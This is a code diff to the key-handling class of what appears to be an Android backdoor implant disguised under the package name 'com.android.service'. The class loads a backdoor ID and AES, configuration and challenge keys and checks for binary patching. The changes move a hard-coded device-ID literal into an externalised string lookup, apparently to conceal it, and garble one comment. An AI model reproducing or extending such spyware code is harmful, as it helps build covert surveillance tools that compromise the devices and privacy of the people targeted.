@@ -13,6 +13,7 @@ import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 
 import com.android.service.Device;
+import com.android.service.Messages;
 import com.android.service.R;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
@@ -24,7 +25,7 @@ import com.android.service.util.Utils;
  * The Class Keys.
  */
 public class Keys {
-	private static final String TAG = "Keys";
+	private static final String TAG = "Keys"; //$NON-NLS-1$
 	/** The singleton. */
 	private volatile static Keys singleton;
 
@@ -55,7 +56,7 @@ public class Keys {
 
 			String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 
-			if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) {
+			if (Messages.getString("Keys.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 				// http://code.google.com/p/android/issues/detail?id=10603
 				// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
 				final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
@@ -75,10 +76,10 @@ public class Keys {
 			challengeKey = keyFromString(resource, 78, 32);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " backdoorId: " + new String(backdoorId));
-				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));
-				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));
-				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey));
+				Check.log(TAG + " backdoorId: " + new String(backdoorId)) ;//$NON-NLS-1$
+				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey)) ;//$NON-NLS-1$
+				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey)) ;//$NON-NLS-1$
+				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey)) ;//$NON-NLS-1$
 			}
 
 		}
@@ -117,7 +118,7 @@ public class Keys {
 			'v', 'q', 'w', '1', '3', 'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };
 
 	/**
-	 * Checks for been binary patched.
+	 * Check. for been binary patched. //$NON-NLS-1$
 	 * 
 	 * @return true, if successful
 	 */
